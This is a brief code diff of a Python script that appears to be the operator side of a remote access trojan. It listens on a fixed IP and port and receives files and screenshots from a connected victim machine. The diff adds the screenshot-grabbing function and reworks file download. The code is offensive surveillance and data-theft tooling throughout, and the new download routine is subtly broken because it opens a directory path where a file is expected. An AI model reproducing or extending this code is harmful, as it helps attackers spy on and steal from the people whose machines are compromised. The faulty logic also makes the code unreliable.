@@ -1,13 +1,22 @@
 import socket
-
+import os
 listener_ip = '192.168.0.108'
 listener_port = 6996
 
-def download():
-    file_recv = open('file_download/file_download.txt','wb')
+def download(file_name):
+    file = os.path.join(os.path.dirname(file_name))
+    file_recv = open(file, 'wb')
     data_recv = target.recv(2048)
     file_recv.write(data_recv)
     file_recv.close()
+
+def screenshot():
+    num = 1
+    sc = open('ScreenShot/Screenshot_%d'%num, 'wb')
+    img = target.recv(2048)
+    sc.write(img)
+    sc.close()
+
 
 def upload(file_name):
     file_upload = open(file_name, 'rb')
